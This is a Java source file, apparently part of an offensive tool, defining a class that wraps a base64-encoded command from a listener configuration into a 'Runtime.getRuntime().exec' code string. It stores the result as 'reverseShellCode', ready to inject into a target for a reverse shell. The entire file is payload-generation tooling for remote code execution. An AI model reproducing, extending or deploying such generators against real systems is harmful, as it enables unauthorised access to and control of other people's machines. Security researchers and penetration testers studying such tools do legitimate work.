package generators;

import java.util.Base64;

public class ExecCodeGenerator extends CommandGenerator{

    public final static String DEFAULT_CODE_TEMPLATE = "java.lang.Runtime.getRuntime().exec(\"%s\")";

    public String reverseShellCode;

    public ExecCodeGenerator(Listener listener){
        super(listener);
        reverseShellCode = codeWrapper(super.getBase64CommandTpl());
    }

    public ExecCodeGenerator(Listener listener,String commandTemplate){
        super(listener,commandTemplate);
        reverseShellCode = codeWrapper(super.getBase64CommandTpl());
    }

    public ExecCodeGenerator(Listener listener,String commandTemplate,String codeTemplate){
        super(listener,commandTemplate);
        reverseShellCode = codeWrapper(codeTemplate, super.getBase64CommandTpl());
    }

    public String codeWrapper(String cmd){
        return String.format(DEFAULT_CODE_TEMPLATE,cmd);
    }

    public String codeWrapper(String codeTemplate,String cmd){
        return String.format(codeTemplate,cmd);
    }

}
